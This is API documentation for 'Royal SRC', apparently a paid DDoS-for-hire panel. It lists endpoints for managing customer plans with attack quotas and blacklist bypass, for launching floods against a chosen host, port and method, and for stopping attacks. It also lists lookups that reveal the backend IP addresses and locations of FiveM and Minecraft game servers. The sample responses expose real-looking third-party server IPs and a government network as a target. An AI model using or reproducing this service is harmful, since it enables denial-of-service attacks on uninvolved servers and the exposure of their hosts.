# **All API endpoints**

# Reseller and Admin API endpoints

>**Add a new user to the database**
URL: https://YOUR_CLOUDFLARE_DOMAIN/admin/add_user?username=&password=&username_to_add=&password_to_add=&preset_to_use={PRESET_NAME}
**preset_to_use options**:
`String`: All presets in the assets/config/presets.json "presets" section.

    Response:
        {
            "error": false/true,
            "message": "API response will be here."
        }

>**Edit a user in the database**
URL: https://YOUR_CLOUDFLARE_DOMAIN/admin/edit_user?username=YOUR_ADMIN_USERNAME_HERE&password=PASSWORD&user_to_edit=USERNAME&field_to_edit=Integer&new_value=NEWVALUE
**user_to_edit options**:
`String`: All users that exist in the database.
**field_to_edit options**: 
`String`: password
`Integer`: Cooldown, MaxTime, Concurrents, max_daily_attacks, set_days, add_days
`Bool`: VIP, Reseller, Holder, Api, Powersaving, Bypassblacklist, Banned

    Response:
        {
            "error": false/true,
            "message": "API response will be here."
        }

>**Remove a user from the database**
URL: https://YOUR_CLOUDFLARE_DOMAIN/admin/delete_user?username=YOUR_ADMIN_USERNAME_HERE&password=YOUR_PASSWORD_HERE&user_to_delete=USERNAME_TO_REMOVE
**user_being_removed options**:
`String`: All users that exist in the database. ( Can't remove root user)

    Response:
        {
            "error": false/true,
            "message": "API response will be here."
        }

>**View a specific user's attack logs in the database**
URL: http://YOUR_SERVER_IP/admin/view_user_logs?username=YOUR_ADMIN_USERNAME_HERE&password=YOUR_PASSWORD_HERE&user_to_view=USERNAME_TO_SEARCH
**user_to_view options**:
`String`: All users that exist in the database.

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        {
	    	"error":     false,
	    	"user_logs": [{},{},{}]
	    }

>**View a specific user's plan information**
URL: http://YOUR_SERVER_IP/admin/view_user_plan?username=YOUR_ADMIN_USERNAME_HERE&password=YOUR_PASSWORD_HERE&user_to_view=USERNAME_TO_SEARCH
**user_to_view options**:
`String`: All users that exist in the database.

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        {
            "username": "root",
            "admin": false,
            "max_time": 500,
            "cooldown": 10,
            "concurrents": 3,
            "powersaving": false,
            "bypass_anti_spam": false,
            "bypass_blacklist": false,
            "reseller": false,
            "vip": true,
            "owner": false,
            "holder": true,
            "api": true,
            "creation_date": "2025-01-08 21:44:55",
            "max_daily_attacks": 1000,
            "attacks_remaining": 978,
            "expiry_unix": 1779572716,
            "formatted_expiry": "23-05-2026 21:45:16",
        "created_by": "root"
        }

# Admin API endpoints

>**View all attack logs that are stored in the database**
URL: https://YOUR_CLOUDFLARE_DOMAIN/admin/view_all_logs?username=YOUR_ADMIN_USERNAME_HERE&password=YOUR_PASSWORD_HERE

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        {
            "error": false,
            "logs": [{},{},{}]
        }

>**View all users in the database and their plan information**
URL: https://YOUR_CLOUDFLARE_DOMAIN/admin/view_all_users?username=YOUR_ADMIN_USERNAME_HERE&password=YOUR_PASSWORD_HERE

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        {
            "error": false,
            "users": [{},{},{}]
        }

# Root User API endpoints

>**View build and license key information**
URL: https://YOUR_CLOUDFLARE_DOMAIN/admin/key_info?username=YOUR_ADMIN_USERNAME_HERE&password=YOUR_PASSWORD_HERE

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        {
            "created_by": "root",
            "days_remaining": "973.69",
            "dev_infos": "royalprojets.com",
            "dlc_status": "true",
            "ip_address": "IP ADRESS",
            "license_key": "License Key",
             "product_name": "Royal SRC",
            "royal_src_version": "1.8.5.4"
        }

# All users API endpoints

>**View your running attacks (Admins and Mods see all running attacks)**
URL: https://YOUR_CLOUDFLARE_DOMAIN/api/view_ongoing?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        Admin/Owner:
		{
			"error":     false,
			"user_only": false,
			"ongoing":   [{},{},{}]
		}
        Non-Admin/Owner:
		{
			"error":     false,
			"user_only": true,
			"ongoing":   [{},{},{}]
		}

>**View network statistics**
URL: https://YOUR_CLOUDFLARE_DOMAIN/api/network_statistics

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        {
           "online_users_count": 1,
           "total_users_count": 239,
           "active_users_count": 129,
           "expired_users_count": 23,
           "attacks_are_enabled": true,
           "total_ongoing_attacks": 4,
           "max_attack_c2_slots": 9,
           "max_attack_api_slots": 10,
           "maintenance_mode": false,
           "src_name": "Royal SRC",
           "src_uptime": "8 hours 46 minutes",
        }

>**View your plan information**
URL: https://YOUR_CLOUDFLARE_DOMAIN/api/view_plan?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        {
            "username": "test",
            "vip": false,
            "reseller": false,
            "admin": true,
            "holder": false,
            "api_access": true,
            "max_time": 60,
            "cooldown": 10,
            "concurrents": 1,
            "max_sessions": 0,
            "daily_attacks": {
              "max": 500,
              "remaining": 499
        },
            "bypass_powersaving": false,
            "bypass_blacklist": false,
            "expiry_unix": "No Active",
            "expiry_formatted": "No Active",
            "creation_date": "2025-01-09 06:05:38",
            "created_by": "root",
            "last_login": "N/A",
            "ip_connected": [
              "No IP connected"
        ],
            "active_sessions": 0,
            "plan_type": "Admin",
            "rank": "Admin"
        }

>**Send API attack using assets/funnel.json (assets/dlc/funnel.json if you have Dlc Acces)**
URL: https://YOUR_CLOUDFLARE_DOMAIN/api/attack?username=testo&password=testo&host=44.44.44.44&port=80&time=60&method=udp
Optional API params: &concurrents=1 &rps=64 &threads=10 &geo=EU

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
        {
            "Target": "33.33.33.33",
            "Port": 80,
            "Method_Used": "udp",
            "Time_Used": 60,
            "Len": "1",
            "Threads": 10,
            "RPS": 100,
            "Geo": "EU",
            "target_asn": "AS749 DoD Network Information Center",
            "target_city": "Whitehall",
            "target_country": "United States",
            "target_country_code": "US",
            "target_isp": "DoD Network Information Center",
            "target_org": "DoD Network Information Center",
            "target_region": "Ohio",
            "target_timezone": "America/New_York",
            "target_zip": "43218",
            "Username": "test",
            "Max_Time": 60,
            "Max_Concurrents": 1,
            "Cooldown": 10,
            "Max_Daily_Attacks": "500/500",
            "Holder_Status": false,
            "Vip_Status": false,
            "Api_Status": true,
            "Admin_Status": true,
            "Royal_Infos": "Royal SRC AIO (DLC FUNNEL) By ~ @Royaloakap ~"
        }    

>**Kill Attack in running**
URL: https://YOUR_CLOUDFLARE_DOMAIN/api/stop?username=YOUR_USERNAME_HERE&password=YOUR_PASSWORD_HERE&host={target}

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
		{
			"error":     false,
			"kill_id: "1"
		}

>**Lookup Server Fivem**
URL: https://YOUR_CLOUDFLARE_DOMAIN/lookup/lookup_fivem?cfx_code={CFX_CODE}

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
            "ip_info": {
              "City": "Gravelines",
              "Country": "FR",
              "Hostname": "ip134.ip-137-74-33.eu",
              "IP": "137.74.33.134",
              "Loc": "50.9865,2.1281",
              "Org": "AS16276 OVH SAS",
              "Postal": "59820",
              "Readme": "https://ipinfo.io/missingauth",
              "Region": "Hauts-de-France",
              "Timezone": "Europe/Paris"
        },
            "server": {
              "CurrentClients": 1,
              "DiscordLink": "https://discord.gg/stellantia",
              "EnhancedHosting": "true",
              "Gametype": "Stellantia RP",
              "IP": "137.74.33.134",
              "Map": "San Andreas",
              "MaxClients": 128,
              "Name": "^5Stellantia RP^0",
              "Owner": "DrekRS",
              "Port": "30176",
              "ProjectDesc": "Compatible manette ! Serveur français FreeAccess basé sur un RP USA, plongez dans un RP immersif !",
              "ProjectName": "Stellantia RP",
              "ResourcesCount": 249,
              "ServerVersion": "FXServer-master v1.0.0.12180 linux"
        }

>**Lookup Server MC**
URL: https://YOUR_CLOUDFLARE_DOMAIN/lookup/lookup_mc?server_address={server_address}

    Response:
        {
            "error": true,
            "message": "API response will be here."
        }
        OR
            "ip_info": {
              "City": "Paris",
              "Country": "FR",
              "Hostname": "88-177-70-205.subs.proxad.net",
              "IP": "88.177.70.205",
              "Loc": "48.8534,2.3488",
              "Org": "AS12322 Free SAS",
              "Postal": "75000",
              "Readme": "https://ipinfo.io/missingauth",
              "Region": "Île-de-France",
              "Timezone": "Europe/Paris"
        },
            "server": {
              "City": "Paris",
              "Country": "FR",
              "Hostname": "membre.papanost.fr",
              "IP": "88.177.70.205",
              "Port": 25565,
              "Postal": "75000",
             "Region": "Île-de-France",
              "Timezone": "Europe/Paris"
        }

# More API endpoints coming soon! Join https://t.me/royalsrc for updates!

# Join https://t.me/royaloak_feedback for other Royal services!

# Thans for trust RoyalSRC Brother